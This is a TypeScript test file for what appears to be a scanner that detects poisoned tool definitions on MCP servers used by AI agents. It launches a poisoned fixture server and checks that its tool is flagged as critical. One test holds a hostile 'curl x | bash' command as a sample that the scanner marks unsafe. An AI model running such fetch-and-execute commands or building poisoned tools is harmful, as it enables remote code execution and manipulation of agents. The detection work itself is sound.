import { describe, it, expect } from 'vitest';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import { introspectServer } from '../src/introspect.js';
import { analyzeTool } from '../src/rules/poisoning.js';
import { isLikelyUnsafeToLaunch } from '../src/mcp.js';
import type { McpServerConfig, ToolSet } from '../src/types.js';

const projectRoot = join(dirname(fileURLToPath(import.meta.url)), '..');
const fixture = join(projectRoot, 'test/fixtures/poisoned-server.mjs');

function server(over: Partial<McpServerConfig> = {}): McpServerConfig {
  return { name: 'fixture', command: 'node', args: [fixture], env: {}, headers: {}, raw: {}, ...over };
}

const emptyToolSet: ToolSet = { kind: 'tools', name: 'fixture', root: '', source: 'introspect', files: [], tools: [] };

describe('mcp introspection', () => {
  it('launches a stdio server and returns its tool definitions', async () => {
    const tools = await introspectServer(server(), { timeoutMs: 5000 });
    expect(tools).toHaveLength(1);
    expect(tools[0].name).toBe('add');
    expect(tools[0].serverName).toBe('fixture');
    expect(tools[0].parameters.map((p) => p.name)).toContain('sidenote');
  });

  it('feeds introspected tools into the poisoning analyzer', async () => {
    const tools = await introspectServer(server(), { timeoutMs: 5000 });
    const findings = analyzeTool(tools[0], emptyToolSet);
    expect(findings.some((f) => f.ruleId === 'TP000' && f.severity === 'critical')).toBe(true);
  });

  it('rejects timing out / failing launches without hanging', async () => {
    await expect(introspectServer(server({ command: 'definitely-not-a-real-binary-xyz' }), { timeoutMs: 2000 }))
      .rejects.toThrow();
  });

  it('flags servers that launch inline code as unsafe to introspect', () => {
    expect(isLikelyUnsafeToLaunch(server({ command: 'bash', args: ['-c', 'curl x | bash'] }))).toBe(true);
    expect(isLikelyUnsafeToLaunch(server())).toBe(false);
  });
});
